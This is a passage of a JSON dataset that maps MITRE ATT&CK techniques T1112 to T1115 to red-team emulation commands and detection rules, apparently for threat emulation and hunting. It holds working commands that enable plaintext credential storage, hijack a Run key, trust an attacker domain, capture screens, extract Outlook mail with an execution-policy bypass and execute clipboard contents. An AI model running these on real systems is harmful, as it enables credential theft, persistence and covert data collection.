Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/disable_machine_acct_change", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/disable_machine_acct_change", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Modify Registry": {"attack_technique": "T1112", "display_name": "Modify Registry", "atomic_tests": [{"name": "Modify Registry of Current User Profile - cmd", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n"}}, {"name": "Modify Registry of Local Machine - cmd", "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n", "supported_platforms": ["windows"], "input_arguments": {"new_executable": {"description": "New executable to run on startup instead of Windows Defender", "type": "string", "default": "calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n", "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n"}}, {"name": "Modify registry to store logon credentials", "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n"}}, {"name": "Add domain to Trusted sites Zone", "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n", "supported_platforms": ["windows"], "input_arguments": {"bad_domain": {"description": "Domain to add to trusted site zone", "type": "String", "default": "bad-domain.com"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n"}}, {"name": "Javascript in registry", "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/disable_machine_acct_change", "ATT&CK Technique #1": "T1112", "ATT&CK Technique #2": "", "Technique": "Modify Registry", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/disable_machine_acct_change\":  [\"T1112\"],"}}], "command_list": ["reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f\n", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "powershell/persistence/misc/disable_machine_acct_change", "powershell/persistence/misc/disable_machine_acct_change"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where process_path contains \"reg.exe\"and file_directory contains \"reg.exe\\\" query\"", "name": "Modify Registry"}], "possible_detections": [{"data_source": {"action": "global", "title": "Chafer Activity", "id": "53ba33fd-3a50-4468-a5ef-c583635cfa92", "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018", "references": ["https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/"], "tags": ["attack.persistence", "attack.g0049", "attack.t1053", "attack.s0111", "attack.defense_evasion", "attack.t1112"], "date": "2018/03/23", "modified": "2019/03/01", "author": "Florian Roth, Markus Neis", "detection": {"condition": "1 of them"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"logsource": {"product": "windows", "service": "system"}, "detection": {"selection_service": {"EventID": 7045, "ServiceName": ["SC Scheduled Scan", "UpdatMachine"]}}}}, {"data_source": {"logsource": {"product": "windows", "service": "security"}, "detection": {"selection_service": {"EventID": 4698, "TaskName": ["SC Scheduled Scan", "UpdatMachine"]}}}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection_reg1": {"EventID": 13, "TargetObject": ["*SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UMe", "*SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UT"], "EventType": "SetValue"}, "selection_reg2": {"EventID": 13, "TargetObject": "*\\Control\\SecurityProviders\\WDigest\\UseLogonCredential", "EventType": "SetValue", "Details": "DWORD (0x00000001)"}}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_process1": {"CommandLine": ["*\\Service.exe i", "*\\Service.exe u", "*\\microsoft\\Taskbar\\autoit3.exe", "C:\\wsc.exe*"]}, "selection_process2": {"Image": "*\\Windows\\Temp\\DB\\\\*.exe"}, "selection_process3": {"CommandLine": "*\\nslookup.exe -q=TXT*", "ParentImage": "*\\Autoit*"}}}}, {"data_source": {"title": "OceanLotus Registry Activity", "id": "4ac5fc44-a601-4c06-955b-309df8c4e9d4", "status": "experimental", "description": "Detects registry keys created in OceanLotus (also known as APT32) attacks", "references": ["https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/"], "tags": ["attack.t1112"], "author": "megan201296", "date": "2019/04/14", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": ["*\\SOFTWARE\\Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model", "*\\SOFTWARE\\App\\AppXbf13d4ea2945444d8b13e2121cb6b663\\Application", "*\\SOFTWARE\\App\\AppXbf13d4ea2945444d8b13e2121cb6b663\\DefaultIcon", "*\\SOFTWARE\\App\\AppX70162486c7554f7f80f481985d67586d\\Application", "*\\SOFTWARE\\App\\AppX70162486c7554f7f80f481985d67586d\\DefaultIcon", "*\\SOFTWARE\\App\\AppX37cc7fdccd644b4f85f4b22d5a3f105a\\Application", "*\\SOFTWARE\\App\\AppX37cc7fdccd644b4f85f4b22d5a3f105a\\DefaultIcon"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "DHCP Callout DLL installation", "id": "9d3436ef-9476-4c43-acca-90ce06bdf33a", "status": "experimental", "description": "Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required)", "references": ["https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html", "https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx", "https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx"], "date": "2017/05/15", "author": "Dimitrios Slamaris", "tags": ["attack.defense_evasion", "attack.t1073", "attack.t1112"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": ["*\\Services\\DHCPServer\\Parameters\\CalloutDlls", "*\\Services\\DHCPServer\\Parameters\\CalloutEnabled"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Svchost DLL Search Order Hijack", "id": "602a1f13-c640-4d73-b053-be9a2fa58b77", "status": "experimental", "description": "IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\\Windows\\System32\\ by default. An attacker can place their malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services \"svchost.exe -k netsvcs\" to gain code execution on a remote machine.", "references": ["https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992"], "author": "SBousseaden", "date": "2019/10/28", "tags": ["attack.persistence", "attack.defense_evasion", "attack.t1073", "attack.t1038", "attack.t1112"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 7, "Image": ["*\\svchost.exe"], "ImageLoaded": ["*\\tsmsisrv.dll", "*\\tsvipsrv.dll", "*\\wlbsctrl.dll"]}, "filter": {"EventID": 7, "Image": ["*\\svchost.exe"], "ImageLoaded": ["C:\\Windows\\WinSxS\\*"]}, "condition": "selection and not filter"}, "falsepositives": ["Pentest"], "level": "high"}}, {"data_source": {"title": "Ursnif", "id": "21f17060-b282-4249-ade0-589ea3591558", "status": "experimental", "description": "Detects new registry key created by Ursnif malware.", "references": ["https://blog.yoroi.company/research/ursnif-long-live-the-steganography/", "https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/"], "tags": ["attack.execution", "attack.t1112"], "author": "megan201296", "date": "2019/02/13", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": "*\\Software\\AppDataLow\\Software\\Microsoft\\\\*"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}]}, {"technique_id": "T1113", "commands": [{"source": "atomics/T1113/T1113.yaml", "command": "screencapture /tmp/T1113_desktop.png\n", "name": null}, {"source": "atomics/T1113/T1113.yaml", "command": "screencapture -x /tmp/T1113_desktop.png\n", "name": null}, {"source": "atomics/T1113/T1113.yaml", "command": "xwd -root -out /tmp/T1113_desktop.xwd\nxwud -in /tmp/T1113_desktop.xwd\n", "name": null}, {"source": "atomics/T1113/T1113.yaml", "command": "import -window root /tmp/T1113_desktop.png\n", "name": null}, {"source": "data/abilities/collection/316251ed-6a28-4013-812b-ddf5b5b007f8.yml", "command": {"darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"}}, "windows": {"psh,pwsh": {"command": "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\nscreenshot $bounds \"$HOME\\Desktop\\screenshot.png\";\n"}}}, "name": "capture the contents of the screen"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot_mss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/native_screenshot_mss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screenshot", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screenshot", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Screen Capture": {"attack_technique": "T1113", "display_name": "Screen Capture", "atomic_tests": [{"name": "Screencapture", "description": "Use screencapture command to collect a full desktop screenshot\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Output file path", "type": "Path", "default": "/tmp/T1113_desktop.png"}}, "executor": {"name": "bash", "elevation_required": false, "command": "screencapture #{output_file}\n", "cleanup_command": "rm #{output_file}\n"}}, {"name": "Screencapture (silent)", "description": "Use screencapture command to collect a full desktop screenshot\n", "supported_platforms": ["macos"], "input_arguments": {"output_file": {"description": "Output file path", "type": "Path", "default": "/tmp/T1113_desktop.png"}}, "executor": {"name": "bash", "elevation_required": false, "command": "screencapture -x #{output_file}\n", "cleanup_command": "rm #{output_file}\n"}}, {"name": "X Windows Capture", "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Output file path", "type": "Path", "default": "/tmp/T1113_desktop.xwd"}}, "executor": {"name": "bash", "command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n", "cleanup_command": "rm #{output_file}\n"}}, {"name": "Import", "description": "Use import command to collect a full desktop screenshot\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Output file path", "type": "Path", "default": "/tmp/T1113_desktop.png"}}, "executor": {"name": "bash", "command": "import -window root #{output_file}\n", "cleanup_command": "rm #{output_file}\n"}}]}}, {"Mitre Stockpile - capture the contents of the screen": {"id": "316251ed-6a28-4013-812b-ddf5b5b007f8", "name": "Screen Capture", "description": "capture the contents of the screen", "tactic": "collection", "technique": {"attack_id": "T1113", "name": "Screen Capture"}, "platforms": {"darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"}}, "windows": {"psh,pwsh": {"command": "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\nscreenshot $bounds \"$HOME\\Desktop\\screenshot.png\";\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/screenshot", "ATT&CK Technique #1": "T1113", "ATT&CK Technique #2": "", "Technique": "Screen Capture", "Concatenate for Python Dictionary": "\"powershell/collection/screenshot\":  [\"T1113\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/native_screenshot", "ATT&CK Technique #1": "T1113", "ATT&CK Technique #2": "", "Technique": "Screen Capture", "Concatenate for Python Dictionary": "\"python/collection/osx/native_screenshot\":  [\"T1113\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/native_screenshot_mss", "ATT&CK Technique #1": "T1113", "ATT&CK Technique #2": "", "Technique": "Screen Capture", "Concatenate for Python Dictionary": "\"python/collection/osx/native_screenshot_mss\":  [\"T1113\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/screenshot", "ATT&CK Technique #1": "T1113", "ATT&CK Technique #2": "", "Technique": "Screen Capture", "Concatenate for Python Dictionary": "\"python/collection/osx/screenshot\":  [\"T1113\"],"}}], "command_list": ["screencapture /tmp/T1113_desktop.png\n", "screencapture -x /tmp/T1113_desktop.png\n", "xwd -root -out /tmp/T1113_desktop.xwd\nxwud -in /tmp/T1113_desktop.xwd\n", "import -window root /tmp/T1113_desktop.png\n", {"darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"}}, "windows": {"psh,pwsh": {"command": "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\n$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\nscreenshot $bounds \"$HOME\\Desktop\\screenshot.png\";\n"}}}, "powershell/collection/screenshot", "powershell/collection/screenshot", "python/collection/osx/native_screenshot", "python/collection/osx/native_screenshot", "python/collection/osx/native_screenshot_mss", "python/collection/osx/native_screenshot_mss", "python/collection/osx/screenshot", "python/collection/osx/screenshot"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1114", "commands": [{"source": "atomics/T1114/T1114.yaml", "command": "powershell -executionpolicy bypass -command $PathToAtomicsFolder\\T1114\\Get-Inbox.ps1 -file $home\\desktop\\mail.csv\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/disable_security", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/disable_security", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_emailitems", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_emailitems", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_subfolders", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/get_subfolders", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/mail_search", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/mail_search", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/search_gal", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/search_gal", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/send_mail", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/send_mail", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/view_email", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/mailraider/view_email", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/search_email", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/search_email", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Email Collection": {"attack_technique": "T1114", "display_name": "Email Collection", "attack_link": "https://attack.mitre.org/wiki/Technique/T1114", "atomic_tests": [{"name": "T1114 Email Collection with PowerShell", "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Output file path", "type": "String", "default": "$home\\desktop\\mail.csv"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "powershell -executionpolicy bypass -command $PathToAtomicsFolder\\T1114\\Get-Inbox.ps1 -file #{output_file}\n", "cleanup_command": "del #{output_file} >nul 2>&1\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/disable_security", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/disable_security\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/get_emailitems", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/get_emailitems\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/get_subfolders", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/get_subfolders\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/mail_search", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/mail_search\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/search_gal", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/search_gal\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/send_mail", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/send_mail\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/mailraider/view_email", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"powershell/management/mailraider/view_email\":  [\"T1114\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/search_email", "ATT&CK Technique #1": "T1114", "ATT&CK Technique #2": "", "Technique": "Email Collection", "Concatenate for Python Dictionary": "\"python/collection/osx/search_email\":  [\"T1114\"],"}}], "command_list": ["powershell -executionpolicy bypass -command $PathToAtomicsFolder\\T1114\\Get-Inbox.ps1 -file $home\\desktop\\mail.csv\n", "powershell/management/mailraider/disable_security", "powershell/management/mailraider/disable_security", "powershell/management/mailraider/get_emailitems", "powershell/management/mailraider/get_emailitems", "powershell/management/mailraider/get_subfolders", "powershell/management/mailraider/get_subfolders", "powershell/management/mailraider/mail_search", "powershell/management/mailraider/mail_search", "powershell/management/mailraider/search_gal", "powershell/management/mailraider/search_gal", "powershell/management/mailraider/send_mail", "powershell/management/mailraider/send_mail", "powershell/management/mailraider/view_email", "powershell/management/mailraider/view_email", "python/collection/osx/search_email", "python/collection/osx/search_email"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1115", "commands": [{"source": "atomics/T1115/T1115.yaml", "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "name": null}, {"source": "atomics/T1115/T1115.yaml", "command": "echo Get-Process | clip\nGet-Clipboard | iex\n", "name": null}, {"source": "data/abilities/collection/b007fe0c-c6b0-4fda-915c-255bbc070de2.yml", "command": {"darwin": {"sh": {"command": "pbpaste\n"}}, "windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}, "name": "copy the contents for the clipboard and print them"}, {"source": "Threat Hunting Tables", "command": "cmd.exe <command> | clip", "name": null}, {"source": "Threat Hunting Tables", "command": "cmd.exe clip < readme.txt", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe echo Get-Process | clip", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe echo Get-Process | clip", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/clipboard_monitor", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/clipboard_monitor", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/clipboard", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/clipboard", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Clipboard Data": {"attack_technique": "T1115", "display_name": "Clipboard Data", "attack_link": "https://attack.mitre.org/wiki/Technique/T1115", "atomic_tests": [{"name": "Utilize Clipboard to store or execute commands from", "description": "Add data to clipboard to copy off or execute commands from.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "cleanup_command": "del %temp%\\T1115.txt >nul 2>&1\n"}}, {"name": "PowerShell", "description": "Utilize PowerShell to echo a command to clipboard and execute it\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "echo Get-Process | clip\nGet-Clipboard | iex\n"}}]}}, {"Mitre Stockpile - copy the contents for the clipboard and print them": {"id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "name": "Copy Clipboard", "description": "copy the contents for the clipboard and print them", "tactic": "collection", "technique": {"attack_id": "T1115", "name": "Clipboard Data"}, "platforms": {"darwin": {"sh": {"command": "pbpaste\n"}}, "windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}}}, {"Threat Hunting Tables": {"chain_id": "100128", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "<command> | clip", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "clipboard_data", "mitre_attack": "T1115", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100129", "os": "windows", "parent_process": "cmd.exe", "commandline_string": "clip < readme.txt", "sub_process_1": 